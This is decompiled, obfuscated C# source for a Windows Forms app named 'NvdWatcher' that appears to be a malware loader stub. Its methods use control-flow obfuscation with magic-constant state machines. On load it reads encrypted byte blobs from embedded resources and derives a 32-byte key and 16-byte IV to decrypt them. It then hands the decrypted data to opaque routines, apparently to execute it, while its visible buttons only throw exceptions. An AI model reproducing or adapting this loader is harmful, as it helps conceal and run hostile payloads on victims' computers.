using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ns0;

public class Form1 : Form
{
	[CompilerGenerated]
	private sealed class Class0
	{
		public int[] int_0;

		internal bool method_0(int[] int_1)
		{
			int num = 0;
			while (true)
			{
				int num2;
				int num3;
				if (num >= int_1.Length)
				{
					num2 = 1977410425;
					num3 = 1977410425;
				}
				else
				{
					num2 = -1220186212;
					num3 = -1220186212;
				}
				while (true)
				{
					int num4 = num2;
					switch ((uint)(~(~num4 - -1599170639)) % 6u)
					{
					case 3u:
						num++;
						num2 = 1774887849;
						continue;
					case 1u:
					{
						int num5;
						if (int_1[num] != int_0[num])
						{
							num2 = -993529830;
							num5 = -993529830;
						}
						else
						{
							num2 = -1664475704;
							num5 = -1664475704;
						}
						continue;
					}
					case 0u:
						num2 = -1220186212;
						continue;
					case 4u:
						break;
					default:
						return true;
					case 5u:
						return false;
					}
					break;
				}
			}
		}
	}

	private static Class4 class4_0;

	private IContainer icontainer_0;

	private TextBox textBox1;

	private Button button1;

	private SplitContainer splitContainer1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		method_0();
	}

	private void method_0()
	{
		IEnumerator<int[]> enumerator = method_1().GetEnumerator();
		try
		{
			while (true)
			{
				int num;
				int num2;
				if (!enumerator.MoveNext())
				{
					num = 121172238;
					num2 = 121172238;
				}
				else
				{
					num = -549841987;
					num2 = -549841987;
				}
				while (true)
				{
					int num3 = num;
					uint num4;
					switch ((num4 = (uint)((num3 ^ -973770379 ^ -31266102) * 2089606297)) % 4u)
					{
					case 2u:
					{
						int[] current = enumerator.Current;
						class4_0 = Class4.smethod_0();
						Class6.smethod_0(current);
						num = -1162647484;
						continue;
					}
					case 0u:
						num = -549841987;
						continue;
					default:
						return;
					case 3u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}
		finally
		{
			if (enumerator != null)
			{
				while (true)
				{
					IL_00c8:
					int num5 = -1726355707;
					while (true)
					{
						int num3 = num5;
						uint num4;
						switch ((num4 = (uint)((num3 ^ -973770379 ^ -31266102) * 2089606297)) % 3u)
						{
						case 1u:
							goto IL_008a;
						default:
							goto end_IL_009d;
						case 2u:
							break;
						case 0u:
							goto end_IL_009d;
						}
						goto IL_00c8;
						IL_008a:
						enumerator.Dispose();
						num5 = ((int)num4 * -1121889875) ^ 0x6CA286D1;
						continue;
						end_IL_009d:
						break;
					}
					break;
				}
			}
		}
	}

	public IEnumerable<int[]> method_1(int int_0 = 5)
	{
		while (true)
		{
			int[] int_2 = Class8.smethod_0(Class8.smethod_1(int_0));
			List<int[]> list = new List<int[]>();
			int num = 1897217920;
			while (true)
			{
				int num2 = num;
				uint num3;
				switch ((num3 = (uint)(~(~num2 * 474152085))) % 7u)
				{
				case 6u:
				{
					int num4;
					num = ((num4 != 1) ? (-1406818527) : (-1402467873)) ^ (int)(num3 * 1319598242);
					continue;
				}
				default:
					Class8.smethod_0(int_2);
					num = ((!list.Exists(delegate(int[] int_1)
					{
						int num5 = 0;
						while (true)
						{
							int num6;
							int num7;
							if (num5 >= int_1.Length)
							{
								num6 = 1977410425;
								num7 = 1977410425;
							}
							else
							{
								num6 = -1220186212;
								num7 = -1220186212;
							}
							while (true)
							{
								int num8 = num6;
								switch ((uint)(~(~num8 - -1599170639)) % 6u)
								{
								case 3u:
									num5++;
									num6 = 1774887849;
									continue;
								case 1u:
								{
									int num9;
									if (int_1[num5] != int_2[num5])
									{
										num6 = -993529830;
										num9 = -993529830;
									}
									else
									{
										num6 = -1664475704;
										num9 = -1664475704;
									}
									continue;
								}
								case 0u:
									num6 = -1220186212;
									continue;
								case 4u:
									break;
								default:
									return true;
								case 5u:
									return false;
								}
								break;
							}
						}
					})) ? (-9647777) : 1897217920);
					continue;
				case 0u:
					num = -1951882580;
					continue;
				case 4u:
					break;
				case 2u:
					list.Add((int[])int_2.Clone());
					yield return (int[])int_2.Clone();
					goto case 0u;
				case 3u:
					yield break;
				}
				break;
			}
		}
	}

	public static void smethod_0()
	{
		using List<byte[]>.Enumerator enumerator = Class8.smethod_3<byte[]>(Class10.ResourceManager_0, CultureInfo.CurrentCulture).GetEnumerator();
		while (true)
		{
			int num;
			int num2;
			if (enumerator.MoveNext())
			{
				num = 95688240;
				num2 = 95688240;
			}
			else
			{
				num = -1017766886;
				num2 = -1017766886;
			}
			while (true)
			{
				int num3 = num;
				switch ((uint)(-247052777 - (655204467 - num3 - -1382408425)) % 4u)
				{
				case 3u:
				{
					byte[] current = enumerator.Current;
					class4_0.list_1.Add(new MemoryStream(current));
					num = -1394235103;
					continue;
				}
				case 2u:
					num = 95688240;
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	public static void smethod_1()
	{
		int num = 0;
		num = 279216703;
		Class2 @class = new Class2(-1843543128);
		byte[] array = new byte[32];
		int num2 = 0;
		byte[] array2 = default(byte[]);
		int num7 = default(int);
		while (true)
		{
			int num3;
			int num4;
			if (num2 >= 32)
			{
				num3 = -786445316;
				num4 = -786445316;
			}
			else
			{
				num3 = -1555888975;
				num4 = -1555888975;
			}
			while (true)
			{
				int num5 = num3;
				uint num6;
				switch ((num6 = (uint)(-2043956054 - ~num5 + 635306511)) % 7u)
				{
				case 6u:
					@class = new Class2(num);
					array2 = new byte[16];
					num7 = 0;
					num3 = (int)((num6 * 891686145) ^ 0x13C93B9F);
					continue;
				case 5u:
				{
					int num8;
					if (num7 < 16)
					{
						num3 = 2102845076;
						num8 = 2102845076;
					}
					else
					{
						num3 = -1332261859;
						num8 = -1332261859;
					}
					continue;
				}
				case 4u:
					array2[num7] = @class.method_0();
					num7++;
					num3 = -1105593559;
					continue;
				case 3u:
					num3 = -1555888975;
					continue;
				case 1u:
					array[num2] = @class.method_0();
					num2++;
					num3 = 1977515849;
					continue;
				case 2u:
					break;
				default:
					class4_0.method_0(array);
					class4_0.method_1(array2);
					return;
				}
				break;
			}
		}
	}

	private static int smethod_2(Stream stream_0, int int_0)
	{
		stream_0.Seek(int_0, SeekOrigin.Begin);
		byte[] array = new byte[4];
		stream_0.Read(array, 0, 4);
		int num = 0;
		int num2 = 0;
		while (true)
		{
			int num3 = -2090441243;
			while (true)
			{
				int num4 = num3;
				uint num5;
				switch ((num5 = (uint)(-num4 * -423727977 - -1284483528)) % 5u)
				{
				case 4u:
					num |= array[num2] << num2 * 8;
					num2++;
					num3 = -2146606228;
					continue;
				case 2u:
				{
					int num6;
					if (num2 >= 4)
					{
						num3 = -610516539;
						num6 = -610516539;
					}
					else
					{
						num3 = -3627819;
						num6 = -3627819;
					}
					continue;
				}
				case 1u:
					num3 = (int)((num5 * 981795947) ^ 0x4FC2D3CB);
					continue;
				case 0u:
					break;
				default:
					return num;
				}
				break;
			}
		}
	}

	public static void smethod_3()
	{
		foreach (MemoryStream item in class4_0.list_1)
		{
			try
			{
				class4_0.class3_0.Byte_1 = class4_0.method_8();
				class4_0.class3_0.Byte_0 = class4_0.method_7();
				byte[] array = new byte[smethod_2(item, 1) ^ smethod_2(item, 5)];
				item.Read(array, 0, array.Length);
				class4_0.method_6(array);
				if (!class4_0.method_2())
				{
					continue;
				}
				break;
			}
			catch
			{
				class4_0.method_6(null);
			}
		}
	}

	public static void smethod_4()
	{
		try
		{
			if (class4_0.method_2())
			{
				class4_0.method_4(Class8.smethod_4(class4_0.method_3()));
			}
		}
		catch
		{
		}
	}

	public static void smethod_5()
	{
		class4_0.method_10();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		throw new InvalidProgramException();
	}

	private void method_2(object sender, EventArgs e)
	{
		throw new InvalidProgramException();
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing)
		{
			while (true)
			{
				int num = 975255702;
				while (true)
				{
					int num2 = num;
					uint num3;
					switch ((num3 = (uint)(-(-num2))) % 4u)
					{
					case 2u:
					{
						int num4;
						int num5;
						if (icontainer_0 == null)
						{
							num4 = -616483247;
							num5 = -616483247;
						}
						else
						{
							num4 = -2090826893;
							num5 = -2090826893;
						}
						num = num4 ^ ((int)num3 * -1958256771);
						continue;
					}
					case 1u:
						Environment.Exit(0);
						icontainer_0.Dispose();
						num = (int)((num3 * 1690282137) ^ 0xF2C436A);
						continue;
					case 0u:
						break;
					default:
						goto end_IL_006b;
					}
					break;
				}
				continue;
				end_IL_006b:
				break;
			}
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0240: Unknown result type (might be due to invalid IL or missing references)
		//IL_024a: Expected O, but got Unknown
		textBox1 = new TextBox();
		button1 = new Button();
		splitContainer1 = new SplitContainer();
		((Control)splitContainer1.get_Panel1()).SuspendLayout();
		((Control)splitContainer1.get_Panel2()).SuspendLayout();
		((Control)splitContainer1).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Dock((DockStyle)5);
		((Control)textBox1).set_Location(new Point(0, 0));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(903, 394));
		((Control)textBox1).set_TabIndex(46);
		((Control)textBox1).set_Tag((object)"000010");
		((Control)button1).set_Location(new Point(23, 15));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(415, 31));
		((Control)button1).set_TabIndex(47);
		((Control)button1).set_Text("Stop Watcher");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		splitContainer1.set_Dock((DockStyle)5);
		((Control)splitContainer1).set_Location(new Point(0, 0));
		((Control)splitContainer1).set_Name("splitContainer1");
		splitContainer1.set_Orientation((Orientation)0);
		((Control)splitContainer1.get_Panel1()).get_Controls().Add((Control)(object)textBox1);
		((Control)splitContainer1.get_Panel2()).get_Controls().Add((Control)(object)button1);
		((Control)splitContainer1).set_Size(new Size(903, 589));
		splitContainer1.set_SplitterDistance(394);
		((Control)splitContainer1).set_TabIndex(48);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(903, 589));
		((Control)this).get_Controls().Add((Control)(object)splitContainer1);
		((Control)this).set_Font(new Font("Segoe UI", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("NvdWatcher");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)splitContainer1.get_Panel1()).ResumeLayout(false);
		((Control)splitContainer1.get_Panel1()).PerformLayout();
		((Control)splitContainer1.get_Panel2()).ResumeLayout(false);
		((Control)splitContainer1).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
	}
}
